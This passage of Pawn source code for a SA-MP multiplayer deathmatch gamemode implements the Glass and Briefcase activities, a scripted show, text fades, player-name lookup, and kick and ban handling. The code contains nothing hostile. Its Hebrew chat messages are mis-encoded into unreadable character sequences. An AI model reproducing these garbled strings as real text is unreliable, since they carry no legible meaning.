		if(glassinfo[1] < 2) return EndGlass("юёЇ° ф∙чўЁщэ ∙фЎш°Їх ўшя ю2",-1);
		for(new i=0;i<MAX_PLAYERS_;i++)
		{
			if(IsPlayerConnected(i) && playerinfo[i][waitglass])
			{
				SetFreeze(i,1);
				if(IsPlayerUsingSGuard_(i)) SetPlayerGravity(i,0.008000); // guard_shit
				TakeSpecialComponent(i);
				if(IsPlayerInAnyVehicle(i))
				{
					RemovePlayerFromVehicle(i);
					SetVehicleToRespawn(GetPlayerVehicleID(i));
				}
				SetPlayerPos(i,3188.6211 + floatrand(-5.5,5.5),5116.7515 + floatrand(-8.0,8.0),32.0);
				SetPlayerInterior(i,0);
				SetPlayerVirtualWorld(i,world_glass);
				for(new ii=0;ii<MAX_PLAYERS_;ii++)
				{
					if(IsPlayerConnected(ii))
					{
						ShowPlayerNameTagForPlayer(ii,i,1);
						SetPlayerMarkerForPlayer(ii,i,GetColor(i,85));
					}
				}
				playerinfo[i][invisible] = 0;
				if(playerinfo[i][pet][2]) command(i,"/pet off");
				SetPlayerTeam(i,NO_TEAM);
				SetPlayerHealth(i,100.0);
				SetPlayerArmour(i,0.0);
				ResetWeapons(i);
				SetCameraBehindPlayer(i);
				SendClientMessage(i,orange," !сфЎьчф");
				playerinfo[i][inact] = 1;
			}
		}
	}
	if(glassinfo[2] == 0)
	{
		for(new i=0;i<MAX_PLAYERS_;i++)
		{
			if(IsPlayerConnected(i) && playerinfo[i][waitglass])
			{
				playerinfo[i][inglass] = 1, playerinfo[i][waitglass] = 0;
				SetFreeze(i,0);
			}
		}
		SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х [ " @c(lightblue) "ЇЄщьх· рхшхюшщ·" @h(6DC5F3) " ] Х Х Х Х Х");
		format(string,sizeof(string)," ф·чщьф! юёЇ° фю∙··Їщэ: %d (Glass) ·ч°х· фцыхыщх·",glassinfo[1]);
		SendClientMessageToAll(green,string);
		SendClientMessageToAll(grey," /astats ьЎЇщщф с∙чўЁщ фЇЄщьх· Х /aquit - ьщЎщрф юфЇЄщьх·");
		SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х");
		KillTimer(glassinfo[3]);
		glassinfo[3] = SetTimer("CheckGlass",1000,1);
	}
	#if lagtest
		LagTest_End("StartGlass2");
	#endif
	if(debugstate) printf("Gamemode Activity [end]: StartGlass2");
	return 1;
}
//=[CheckGlass]=================================================================
public CheckGlass()
{
	#if lagtest
		LagTest_Start("CheckGlass");
	#endif
	glassinfo[4]++;
	if(glassinfo[4] >= 4)
	{
		glassinfo[4] = 0;
		new r = -1, Float:p[3];
		do r = random(sizeof(glassobj));
		while glassobj[r] == -1;
		GetSObjectPos(glassobj[r],p[0],p[1],p[2]);
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][inglass] && IsPlayerInRangeOfPoint(i,3.0,p[0],p[1],p[2]))
		{
			switch(random(2))
			{
				case 0: SendClientMessage(i,red,"WATCH OUT!");
				case 1: SendClientMessage(i,red," !цфщ°х·");
			}
			PlaySound(i,1058);
		}
		MoveSObject(glassobj[r],p[0],p[1],p[2]-2.5,1.2,0.0,0.0,0.0);
		objectinfo[glassobj[r]][odam] = 1, glassobj[r] = -1, r = 0;
		for(new i = 0; i < sizeof(glassobj); i++) if(glassobj[i] != -1) r++;
		if(r == 1) SetTimer("WinGlass",2500,0);
	}
	for(new i = 0, Float:p[2]; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][inglass])
	{
		GetPlayerPos(i,p[0],p[0],p[1]);
		if(p[1] < 29.0)
		{
			OutOfActivity(i);
			SendClientMessage(i,red," .(Glass) фЇёу· с·ч°х· фцыхыщх·");
		}
	}
	#if lagtest
		LagTest_End("CheckGlass");
	#endif
	return 1;
}
//=[WinGlass]===================================================================
public WinGlass()
{
	assert glassinfo[0];
	#if lagtest
		LagTest_Start("WinGlass");
	#endif
	new winner[MAX_PLAYERS] = {-1,...}, winners = 0, string[M_S];
	for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][inglass]) winner[winners] = i, winners++;
	switch(winners)
	{
		case 0: SendClientMessageToAll(yellow," !рщя юЁЎчщэ с·ч°х· фтьрё");
		case 1:
		{
			format(string,sizeof(string),"%s ~n~~w~is the winner in the ~b~glass~w~!",GetName(winner[0]));
			MovingText(string,mt_activity,GetPlayerColor(winner[0]));
			format(string,sizeof(string)," !ЁщЎч с·ч°х· фтьрё %s",GetName(winner[0]));
			SendClientMessageToAll(yellow,string);
		}
		default:
		{
			format(string,sizeof(string)," :фюЁЎчщэ с·ч°х· фтьрё фэ %d",winners);
			SendClientMessageToAll(yellow,string);
			string = "";
			for(new i = 0; i < winners; i++) format(string,sizeof(string),"%s Х %s",string,GetName(winner[i]));
			strdel(string,0,2);
			SendClientMessageToAll(yellow,string);
			format(string,sizeof(string)," .ыь фюЁЎчщэ цых сёыхэ фыёЇщ " #actprize_glass "$ ∙ф·чьў ьюёЇ° фюЁЎчщэ, хфёыхэ ∙щщЎр - %d$",actprize_glass/winners);
			SendClientMessageToAll(yellow,string);
		}
	}
	for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][inglass])
	{
		SpawnPlayer(i);
		playerinfo[i][inglass] = 0, playerinfo[i][waitglass] = 0;
		playerinfo[i][inact] = 0;
	}
	for(new i = 0; i < winners; i++) if(winner[i] > -1)
	{
		GiveMoney(winner[i],actprize_glass / winners, 10);
		act_SaveWin(winner[i],act_Code(aid_glass));
	}
	glassinfo[0] = 0, glassinfo[1] = 0, glassinfo[2] = 0, glassinfo[4] = 0;
	thereIsAct = false;
	KillTimer(glassinfo[3]);
	ReloadGlass();
	#if lagtest
		LagTest_End("WinGlass");
	#endif
	return 1;
}
//=[BackgroundWorker]===========================================================
public BackgroundWorker()
{
	#if lagtest
		LagTest_Start("BackgroundWorker");
	#endif
	if(tfoPlayers > 0)
	{
		new playerid = INVALID_PLAYER_ID;
		for(new i = 0; i < tfoPlayers; i++)
		{
			playerid = tfoPlayer[i];
			switch(playerinfo[playerid][tfostatus])
			{
				case tfo_fade: // Basic idea by Joe Staff
				{
					if(playerinfo[playerid][sfsteps] > 0)
					{
						playerinfo[playerid][sfsteps]--;
						for(new c = 0; c < 4; c++)
						{
							playerinfo[playerid][sfcur][c] -= playerinfo[playerid][sfrate][c];
							if((playerinfo[playerid][sfrate][c] > 0 && playerinfo[playerid][sfcur][c] < playerinfo[playerid][sfend][c])
							|| (playerinfo[playerid][sfrate][c] < 0 && playerinfo[playerid][sfcur][c] > playerinfo[playerid][sfend][c])) playerinfo[playerid][sfcur][c] = playerinfo[playerid][sfend][c];
							if(playerinfo[playerid][sfcur][c] < 0) playerinfo[playerid][sfcur][c] = 0;
							if(playerinfo[playerid][sfcur][c] > 255) playerinfo[playerid][sfcur][c] = 255;
						}
						TextDrawBoxColor(fadeText,rgba2hex(playerinfo[playerid][sfcur][0],playerinfo[playerid][sfcur][1],playerinfo[playerid][sfcur][2],playerinfo[playerid][sfcur][3]));
						TextDrawShowForPlayer(playerid,fadeText);
					}
					else if(!playerinfo[playerid][sfsteps])
					{
						playerinfo[playerid][sfsteps] = -1;
						ScreenFadeComplete(playerid,0);
					}
					else if(playerinfo[playerid][sfhold] > 0) playerinfo[playerid][sfhold]--;
					else if(!playerinfo[playerid][sfhold])
					{
						playerinfo[playerid][sfhold] = -1;
						TextDrawHideForPlayer(playerid,fadeText);
						ScreenFadeComplete(playerid,1);
					}
				}
			}
		}
	}
	for(new i = 0; i < MAX_MOVING_TEXTS; i++) if(movingtextinfo[i][mtUsing])
	{
		TextDrawHideForAll(movingtext[i]);
		TextDrawDestroy(movingtext[i]);
		movingtextinfo[i][mtX] -= 1.0;
		if(movingtextinfo[i][mtX] <= 0.000000) movingtextinfo[i][mtUsing] = 0;
		else
		{
			movingtext[i] = TextDrawCreate(movingtextinfo[i][mtX],movingtextinfo[i][mtY],movingtextinfo[i][mtText]);
			TextDrawAlignment(movingtext[i],0);
			TextDrawBackgroundColor(movingtext[i],0x000000ff);
			TextDrawFont(movingtext[i],1);
			TextDrawLetterSize(movingtext[i],0.399999,1.399999);
			TextDrawColor(movingtext[i],0xffffffff);
			TextDrawSetProportional(movingtext[i],1);
			TextDrawSetShadow(movingtext[i],1);
			TextDrawShowForAll(movingtext[i]);
		}
	}
	/*if(usingAnyFile) if(GetTickCount()-curFileTickCount >= 50)
	{
		curFileTickCount = 0, usingAnyFile = false;
		format(curFileName,sizeof(curFileName),"");
		my_fclose(curFile,true);
	}*/
	#if lagtest
		LagTest_End("BackgroundWorker");
	#endif
	return 1;
}
//=[FullGamemodeLoading]========================================================
public FullGamemodeLoading()
{
	#if lagtest
		LagTest_Start("FullGamemodeLoading");
	#endif
	gamemodeFullyLoaded = true, serverUptime = 0;
	ReloadMusic();
	UpdateSignboards("clans");
	#if lagtest
		LagTest_End("FullGamemodeLoading");
	#endif
	return 1;
}
//=[ScreenFadeComplete]=========================================================
public ScreenFadeComplete(playerid,afterhold)
{
	TFO_Remove(playerid);
	return 1;
}
//=[ShavuotSkin]================================================================
public ShavuotSkin(playerid)
{
	switch(playerinfo[playerid][dmzlevel])
	{
		case 0..1: SetPlayerAttachedObject(playerid,aoslot_shavuot,347,6,0.0,0.0,0.0,0.0,0.0,0.0,1.5,1.5,1.5);
		case 2: SetPlayerAttachedObject(playerid,aoslot_shavuot,353,6,0.0,0.0,0.0,0.0,0.0,0.0,1.8,1.0,1.0);
		case 3: SetPlayerAttachedObject(playerid,aoslot_shavuot,19080,6,0.0,0.0,0.09,30.0,-10.0,0.0,1.0,1.0,1.0);
		case 4: if(IsPlayerAttachedObjectSlotUsed(playerid,aoslot_shavuot)) RemovePlayerAttachedObject(playerid,aoslot_shavuot);
	}
	return 1;
}
//=[StartShow]==================================================================
public StartShow(showid)
{
	#if lagtest
		LagTest_Start("StartShow");
	#endif
	if(debugstate) printf("Gamemode Activity [start]: StartShow(%d)",showid);
	new string[M_S];
	currentShow[0] = showid, currentShow[1] = -1;
	SetTimer("StartShow2",90000,0);
	SendClientMessageToAll(blue,"- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -");
	SendClientMessageToAll(lightblue," :фхЇЄф " @c(lightgreen) "Єхюу· " @c(lightblue) "ьф·чщь " @c(lightgreen) "сЄху " @c(lightblue) "уўф " @c(lightgreen) "хчЎщ");
	SendClientMessageToAll(lightpurple,showinfo[showid][shwName]);
	format(string,sizeof(string)," рх°ъ: %02d:%02d " @c(white) "Х" @c(lightyellow) " %s :сщЎхЄ",showinfo[showid][shwLength][0],showinfo[showid][shwLength][1],showinfo[showid][shwSinger]);
	SendClientMessageToAll(lightgreen,string);
	format(string,sizeof(string)," /Show Join ?ы°шщё ыЁщёф Єхьф $%d, °хЎф ьфЎш°є " @c(white) "Х" @c(lightyellow) " /Show Info :ьющуЄ Ёхёє",showinfo[showid][shwCost]);
	SendClientMessageToAll(lightgreen,string);
	SendClientMessageToAll(blue,"- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -");
	format(string,sizeof(string),"~b~%s~n~~b~~h~~h~/show join",showinfo[showid][shwSinger]);
	GameTextForAll(string,6000,1);
	#if lagtest
		LagTest_End("StartShow");
	#endif
	if(debugstate) printf("Gamemode Activity [end]: StartShow(%d)",showid);
	return 1;
}
//=[StartShow2]=================================================================
public StartShow2()
{
	new string[M_S];
	currentShow[1] = 0, currentShow[2] = SetTimer("DuringShow",1000,1);
	format(string,sizeof(string)," !!!%s ффхЇЄф ю·чщьф! ўсьх р· фсщЎхЄ ∙ь",showinfo[currentShow[0]][shwSinger]);
	BotSay(string,true);
	SetWorldTime(0);
	return 1;
}
//=[DuringShow]=================================================================
public DuringShow()
{
	assert currentShow[0] > -1;
	const MAX_CMD_LENGTH = 200;
	new File:f, read[MAX_CMD_LENGTH], params[MAX_CMD_LENGTH], string[M_S], foundTime = 0, cmd[64];
	valstr(string,currentShow[1]);
	ToRCON(white,string);
	format(string,sizeof(string),folder_shows "%d.ini",currentShow[0]+1);
	f = fopen(string,io_read);
	while(fread(f,read))
	{
		//if(currentShow[1] > ((showinfo[currentShow[0]][shwLength][0]*60)+showinfo[currentShow[0]][shwLength][0])) break;
		if(read[0] == '#') continue;
		strmid(string,read,0,strfind(read,";"));
		if(currentShow[1] == (foundTime = strval(string)))
		{
			strmid(string,read,strfind(read,";")+1,strlen(read)-1);
			if(strfind(string,";") == -1)
			{
				strmid(string,read,strfind(read,";")+1,strlen(read));
				ExecuteShowCommand(string,"");
			}
			else
			{
				strmid(cmd,string,0,strfind(string,";"));
				strmid(params,string,strfind(string,";")+1,strlen(string));
				ExecuteShowCommand(cmd,params);
			}
		}
	}
	#pragma unused foundTime
	fclose(f);
	currentShow[1]++;
	return 1;
}
//=[EndShow]====================================================================
public EndShow()
{
	for(new i = 0; i < sizeof(currentShowNPCs); i++)
	{
		if(currentShowNPCs[i] != INVALID_PLAYER_ID && IsPlayerNPC(currentShowNPCs[i])) Kick(currentShowNPCs[i]);
		currentShowNPCs[i] = INVALID_PLAYER_ID;
	}
	for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && GetPlayerVirtualWorld(i) == world_show)
	{
		SpawnPlayer(i);
		StopAudioStreamForPlayer(i);
	}
	KillTimer(currentShow[2]);
	currentShow[0] = -1, currentShow[1] = -1, currentShow[2] = -1;
	BotSay(" !·хуф ьыхьэ, ффхЇЄф фё·щщюф",true);
	return 1;
}
//=[StartBriefcase]=============================================================
public StartBriefcase()
{
	if(debugstate) printf("Gamemode Activity [start]: StartBriefcase");
	if(thereIsAct) return 0;
	#if lagtest
		LagTest_Start("StartBriefcase");
	#endif
	briefcaseinfo[0] = 1, briefcaseinfo[1] = 0, briefcaseinfo[2] = 60, briefcaseinfo[3] = SetTimer("StartBriefcase2",1000,1);
	SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х [ " @c(lightblue) "ЇЄщьх· рхшхюшщ·" @h(6DC5F3) " ] Х Х Х Х Х");
	SendClientMessageToAll(green," !··чщь сЄху уўф, р·э юхцюЁщэ ьф∙··є (Briefcase) ЇЄщьх· юЎр р· фюцххуф");
	SendClientMessageToAll(green," /join рх /bc join ьфЎш°Їх· °∙юх р· фЇўхуф");
	SendClientMessageToAll(yellow," * .фЎш°Їх· ьЇЄщьх· фюцххуф Єхьф " #join_act "$ хфЇ°ё фхр ёў°хь ющхчу");
	SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х");
	GameTextForAll("~b~briefcase~n~/join",6000,1);
	thereIsAct = true;
	#if lagtest
		LagTest_End("StartBriefcase");
	#endif
	if(debugstate) printf("Gamemode Activity [end]: StartBriefcase");
	return 1;
}
//=[StartBriefcase2]============================================================
public StartBriefcase2()
{
	if(debugstate) printf("Gamemode Activity [start]: StartBriefcase2");
	#if lagtest
		LagTest_Start("StartBriefcase2");
	#endif
	new string[M_S];
	briefcaseinfo[2]--;
	if(briefcaseinfo[2] > 0)
	{
		for(new i=0;i<sizeof(ActivitiesGameTextTimes);i++)
		{
			if(briefcaseinfo[2] == ActivitiesGameTextTimes[i])
			{
				format(string,sizeof(string),"~b~Briefcase: ~h~%d~n~~b~(%d/%d)",briefcaseinfo[2],briefcaseinfo[1],MAX_ACTIVITY_PLAYERS);
				GameTextForAll(string,999,4);
				for(new ii=0;ii<MAX_PLAYERS_;ii++) if(IsPlayerConnected(ii) && !playerinfo[ii][modeafk]) PlaySound(ii,1056);
			}
		}
		if(briefcaseinfo[2] == 10 || briefcaseinfo[2] == 30)
		{
			format(string,sizeof(string)," /join :··чщь сЄху %d ∙Ёщх·, ьфЎш°Їх· (Briefcase) ЇЄщьх· юЎр р· фюцххуф",briefcaseinfo[2]);
			SendClientMessageToAll(brown,string);
		}
	}
	if(briefcaseinfo[2] == 3)
	{
		if(briefcaseinfo[1] < 2) return EndBriefcase("юёЇ° ф∙чўЁщэ ∙фЎш°Їх ўшя ю2",-1);
		for(new i = 0, r = 0; i < MAX_PLAYERS_; i++)
		{
			if(IsPlayerConnected(i) && playerinfo[i][waitbriefcase])
			{
				SetFreeze(i,1);
				if(IsPlayerUsingSGuard_(i)) SetPlayerGravity(i,0.008000); // guard_shit
				TakeSpecialComponent(i);
				if(IsPlayerInAnyVehicle(i))
				{
					RemovePlayerFromVehicle(i);
					SetVehicleToRespawn(GetPlayerVehicleID(i));
				}
				playerinfo[i][inarea51] = 1;
				r = random(sizeof(BriefcasePositions));
				SetPlayerPos(i,BriefcasePositions[r][0],BriefcasePositions[r][1],BriefcasePositions[r][2]);
				SetPlayerFacingAngle(i,BriefcasePositions[r][3]);
				SetPlayerInterior(i,9);
				DisablePlayerCheckpoint(i);
				SetPlayerCP(i,315.5849,1033.2284,1946.3142,6.0);
				ResetWeapons(i);
				GiveWeapon(i,46,0);
				SetPlayerVirtualWorld(i,world_briefcase);
				for(new ii=0;ii<MAX_PLAYERS_;ii++)
				{
					if(IsPlayerConnected(ii))
					{
						ShowPlayerNameTagForPlayer(ii,i,1);
						SetPlayerMarkerForPlayer(ii,i,GetColor(i,85));
					}
				}
				playerinfo[i][invisible] = 0;
				if(playerinfo[i][pet][2]) command(i,"/pet off");
				SetPlayerTeam(i,NO_TEAM);
				SetPlayerHealth(i,100.0);
				SetPlayerArmour(i,0.0);
				SetCameraBehindPlayer(i);
				SendClientMessage(i,orange," !сфЎьчф! Єьщъ ьюЎхр р· фюцххуф ∙юхчср· срцх° фЎср");
				playerinfo[i][inact] = 1;
			}
		}
	}
	if(briefcaseinfo[2] == 0)
	{
		for(new i=0;i<MAX_PLAYERS_;i++)
		{
			if(IsPlayerConnected(i) && playerinfo[i][waitbriefcase])
			{
				playerinfo[i][inbriefcase] = 1, playerinfo[i][waitbriefcase] = 0;
				SetFreeze(i,0);
			}
		}
		SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х [ " @c(lightblue) "ЇЄщьх· рхшхюшщ·" @h(6DC5F3) " ] Х Х Х Х Х");
		format(string,sizeof(string)," ф·чщьф! юёЇ° фю∙··Їщэ: %d (Briefcase) ЇЄщьх· юЎр р· фюцххуф",briefcaseinfo[1]);
		SendClientMessageToAll(green,string);
		SendClientMessageToAll(grey," /astats ьЎЇщщф с∙чўЁщ фЇЄщьх· Х /aquit - ьщЎщрф юфЇЄщьх·");
		SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х");
		KillTimer(briefcaseinfo[3]);
		briefcaseinfo[4] = 180;
		briefcaseinfo[3] = SetTimer("CheckBriefcase",1000,1);
		new rnd = random(sizeof(Briefcases));
		briefcaseinfo[5] = CreatePickupEx(1575,1,Briefcases[rnd][0],Briefcases[rnd][1],Briefcases[rnd][2],33, world_briefcase);
	}
	#if lagtest
		LagTest_End("StartBriefcase2");
	#endif
	if(debugstate) printf("Gamemode Activity [end]: StartBriefcase2");
	return 1;
}
//=[CheckBriefcase]=============================================================
public CheckBriefcase()
{
	#if lagtest
		LagTest_Start("CheckBriefcase");
	#endif
	briefcaseinfo[4]--;
	if(!briefcaseinfo[4])
	{
		SendClientMessageToAll(yellow," .рщя юЁЎчщэ сЇЄщьх· юЎр р· фюцххуф! фщр ьр ЁюЎрф сцюя");
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][inbriefcase])
		{
			SpawnPlayer(i);
			playerinfo[i][inbriefcase] = 0, playerinfo[i][waitbriefcase] = 0;
			playerinfo[i][inact] = 0;
		}
		briefcaseinfo[0] = 0, briefcaseinfo[1] = 0, briefcaseinfo[2] = 0, briefcaseinfo[4] = 0;
		thereIsAct = false;
		KillTimer(briefcaseinfo[3]);
	}
	else
	{
		new string[M_S];
		if(briefcaseinfo[4] >= 60 && briefcaseinfo[4] % 60 == 0)
		{
			if(briefcaseinfo[4] / 60 == 1) format(string,sizeof(string)," !Ёх·°ф уўф рч· ьюЎщр· фюцххуф");
			else format(string,sizeof(string)," !Ёх·°х %d уўх· ьюЎщр· фюцххуф",briefcaseinfo[4] / 60);
		}
		else if(briefcaseinfo[4] % 10 == 0) format(string,sizeof(string)," !Ёх·°х %d ∙Ёщх· ьюЎщр· фюцххуф",briefcaseinfo[4]);
		if(strlen(string) > 0) for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][inbriefcase]) SendClientMessage(i,yellow,string);
	}
	#if lagtest
		LagTest_End("CheckBriefcase");
	#endif
	return 1;
}
//=[ShowCredits]================================================================
stock ShowCredits()
{
	printf(" * %s DeathMatch",webpage);
	printf(" * й Copyright 2008-2015, Amit Barami (`Amit_B`)");
	printf(" * Version: " version);
	//printf(" * Creation Date: v1 01/04/2008 | v2 17/11/2008 | v3 29/06/2009 | v4 18/07/2009 | v5 25/12/2009 | v6 13/12/2010"); I'm really lazy to edit this everytime -_-
	return 1;
}
//=[strtok]=====================================================================
stock strtok(const string[], &index, somechar = ' ')
{   // by CompuPhase, improved by me
	new length = strlen(string), result[60];
	while((index < length) && (string[index] <= somechar)) index++;
	new offset = index;
	while((index < length) && (string[index] > somechar) && ((index - offset) < (sizeof(result) - 1))) result[index - offset] = string[index], index++;
	result[index - offset] = EOS;
	return result;
}
//=[strrest]====================================================================
stock strrest(const string[], index, somechar = ' ')
{   // by CompuPhase, improved by me
	new length = strlen(string), offset = index, result[M_S];
	while((index < length) && ((index - offset) < (sizeof(result) - 1)) && (string[index] > '\r')) result[index - offset] = string[index], index++;
	result[index - offset] = EOS;
	if(result[0] == somechar && string[0] != somechar) strdel(result,0,1);
	return result;
}
//=[GetName]====================================================================
stock GetName(playerid)
{
	new n[MAX_PLAYER_NAME];
	if(playerid == ConsoleID) format(n,sizeof(n),ConsoleName);
	else if(playerinfo[playerid][selfnpc] != -1) format(n,sizeof(n),NPCs[playerinfo[playerid][selfnpc]][npcName]);
	else format(n,sizeof(n),playerinfo[playerid][playername]);//GetPlayerName(playerid,n,sizeof(n));
	return n;
}
//=[IsPlayerInAmmunation]====================================================================
stock IsPlayerInAmmunation(playerid)
{
	if(IsPlayerInRangeOfPoint(playerid,5,296.5055,-38.5050,1001.5156) && GetPlayerInterior(playerid) == 1 ||
	IsPlayerInRangeOfPoint(playerid,5,290.3027,-109.5433,1001.5156) && GetPlayerInterior(playerid) == 6 ||
	IsPlayerInRangeOfPoint(playerid,5,296.2880,-38.3293,1001.5156) && GetPlayerInterior(playerid) == 1 ||
 	IsPlayerInRangeOfPoint(playerid,5,295.7100,-80.7987,1001.5156) && GetPlayerInterior(playerid) == 4 ||
  	IsPlayerInRangeOfPoint(playerid,5,295.6303,-80.7295,1001.5156) && GetPlayerInterior(playerid) == 4 ||
  	IsPlayerInRangeOfPoint(playerid,5,290.4833,-109.7664,1001.5156) && GetPlayerInterior(playerid) == 6 ||
  	IsPlayerInRangeOfPoint(playerid,5,313.0578,-165.4706,999.6010) && GetPlayerInterior(playerid) == 6 ||
  	IsPlayerInRangeOfPoint(playerid,5,289.9247,-109.7705,1001.5156)&& GetPlayerInterior(playerid) == 6 ||
  	IsPlayerInRangeOfPoint(playerid,5,295.7664,-80.8109,1001.5156) && GetPlayerInterior(playerid) == 4 ||
  	IsPlayerInRangeOfPoint(playerid,5,295.7414,-80.8035,1001.5156) && GetPlayerInterior(playerid) == 4 ||
  	IsPlayerInRangeOfPoint(playerid,5,290.0899,-109.7766,1001.5156) && GetPlayerInterior(playerid) == 6)
	{
		return 1;
	}
	return 0;
}
//=[GetIP]======================================================================
stock GetIP(playerid)
{
	new ip[16];
	if(playerinfo[playerid][pp]) format(ip,sizeof(ip),"*.*.*.*");
	else if(!IsPlayerConnected(playerid)) format(ip,sizeof(ip),"Unknown");
	else format(ip,sizeof(ip),playerinfo[playerid][playerip]);//GetPlayerIp(playerid,ip,sizeof(ip));
	return ip;
}
//=[GetSerial]==================================================================
stock GetSerial(playerid)
{
	new code[64];
	if(!IsPlayerConnected(playerid)) format(code,sizeof(code),"None");
	else if(playerinfo[playerid][pp]) format(code,sizeof(code),"Hidden");
	else gpci(playerid,code,sizeof(code));
	return code;
}
//=[fcreate]====================================================================
stock fcreate(filename[])
{
	if(fexist(filename)) return 0;
	new File:f = fopen(filename,io_write);
	fclose(f);
	return 1;
}
//=[IsNumeric]==================================================================
stock IsNumeric(const string[])
{
	for(new i = string[0] == '-' ? 1 : 0, j = strlen(string); i < j; i++) if(string[i] < '0' || string[i] > '9') return 0;
	return 1;
}
//=[ReturnUser]=================================================================
stock ReturnUser(text[],playerid,bool=false)
{   // by Y_Less, improved by me
	new pos = 0, userid = INVALID_PLAYER_ID, count = 0, name[MAX_PLAYER_NAME];
	if(!bool && (text[0] == '#' || text[0] == '@') && strlen(text) <= 10 && playerid != INVALID_PLAYER_ID && playerid != ConsoleID)
	{
		new cmd[32];
		format(cmd,sizeof(cmd),"%s",text[1]);
		if(equal(cmd,"m") || equal(cmd,"me") || equal(cmd,"i")) return playerid;
		else if(equal(cmd,"a") || equal(cmd,"admin"))
		{
			new ret = INVALID_PLAYER_ID;
			for(new i = 0; i < MAX_PLAYERS_ && ret == INVALID_PLAYER_ID; i++) if(IsPlayerConnected(i) && IsPlayerMAdmin(i) && i != playerid) ret = i;
			return ret;
		}
		else if(equal(cmd,"r") || equal(cmd,"random")) return GetRandomPlayer();
		else if(equal(cmd,"c") || equal(cmd,"clan"))
		{
			if(!playerinfo[playerid][clan]) return INVALID_PLAYER_ID;
			new ret = INVALID_PLAYER_ID;
			for(new i = 0; i < MAX_PLAYERS_ && ret == INVALID_PLAYER_ID; i++) if(IsPlayerConnected(i) && playerinfo[i][clan] == playerinfo[playerid][clan] && i != playerid) ret = i;
			return ret;
		}
		else return INVALID_PLAYER_ID;
	}
	while(text[pos] < 0x21)
	{
		if(!text[pos]) return INVALID_PLAYER_ID;
		pos++;
	}
	if(IsNumeric(text[pos]))
	{
		userid = strval(text[pos]);
		if(userid >= 0 && userid < MAX_PLAYERS)
		{
			if(!IsPlayerConnected(userid)) userid = INVALID_PLAYER_ID;
			else return userid;
		}
	}
	new len = strlen(text[pos]);
	for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && (!bool || (bool && playerinfo[i][clan] == playerinfo[playerid][clan])))
	{
		format(name,sizeof(name),GetName(i));
		//if(strcmp(name,text[pos],true,len) == 0)
		if(strfind(name,text,true) != -1)
		{
			if(len == strlen(name)) return i;
			else count++, userid = i;
		}
	}
	if(count != 1) userid = INVALID_PLAYER_ID;
	return userid;
}
//=[GetExactID]=================================================================
stock GetExactID(name[])
{
	for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && equal(GetName(i),name)) return i;
	return INVALID_PLAYER_ID;
}
//=[ReturnClanUser]=============================================================
stock ReturnClanUser(text[],playerid) return ReturnUser(text,playerid,true);
//=[SetKick]====================================================================
stock SetKick(playerid,adminid,reason[],inchat_=1)
{
	if(IsPlayerNPC(playerid)) return 1;
	if(inchat_)
	{
		new string[M_S];
		if(adminid == INVALID_PLAYER_ID) format(string,sizeof(string)," *** %s has been kicked. (%s)",GetName(playerid),reason);
		else if(adminid == ConsoleID) format(string,sizeof(string)," *** %s has been kicked by the Console. (%s)",GetName(playerid),reason);
		else if(adminid == MAX_PLAYERS+1) format(string,sizeof(string)," [" acname "] %s has been kicked. (%s)",GetName(playerid),reason);
		else if(adminid == -1) format(string,sizeof(string)," *** %s has been kicked by %s. (%s)",GetName(playerid),botname,reason);
		else format(string,sizeof(string)," *** %s has been kicked by %s. (%s)",GetName(playerid),GetName(adminid),reason);
		if(!Options[2][optActive] && punishSpam[0] != playerid)
		{
			SendClientMessageToAll(0xff0000aa,string);
			//punishSpam[0] = playerid, punishSpam[1] = 60;
		}
	}
	if(playerinfo[playerid][pp] != 0 && playerinfo[playerid][logged]) return 1;
	if(!(playerinfo[playerid][pp] > 0 && playerinfo[playerid][logged] && playerinfo[playerid][admin] >= 20))
	{
		connected[playerid] = false;
		OnPlayerDisconnect(playerid,2);
		playerinfo[playerid][kicking] = 1;
		Kick(playerid);
	}
	return 1;
}
//=[SetBan]=====================================================================
stock SetBan(playerid,adminid,reason[],inchat_=1,bantype=0,bandays=0)
{
	if(IsPlayerNPC(playerid)) return 1;
	if(IsPlayerConnected(adminid))
	{
		if(lastbaner == adminid)
		{
			lastbanerbans++;
			if(lastbanerbans >= 5)
			{
				playerinfo[adminid][admin] = 0;
				if(fkeyexist(file_admins,GetName(adminid))) fsetint(file_admins,GetName(adminid),0);
				SendClientMessage(adminid,red," .юЄ°ы· фрсшчф цщф·ф рх·ъ ыЇх°ї ьюЄ°ы·. р·ф юх∙Єф, рэ рщЁъ Їх°ї Ўх° ў∙° Єэ ффЁфьф");
				SetBan(adminid,MAX_PLAYERS+1,"ЁщЎхь Ї°щЎф");
			}
		}
		else lastbaner = adminid, lastbanerbans = 1, lastbanerdelay = 20;
	}
	new string[M_S], t[6];
	if(inchat_)
	{
		if(!bandays)
			if(adminid == INVALID_PLAYER_ID) format(string,sizeof(string)," *** %s has been banned. (%s)",GetName(playerid),reason);
			else if(adminid == ConsoleID) format(string,sizeof(string)," *** %s has been banned by the Console. (%s)",GetName(playerid),reason);
			else if(adminid == MAX_PLAYERS+1) format(string,sizeof(string)," [" acname "] %s has been banned. (%s)",GetName(playerid),reason);
			else if(adminid == -1) format(string,sizeof(string)," *** %s has been banned by %s. (%s)",GetName(playerid),botname,reason);
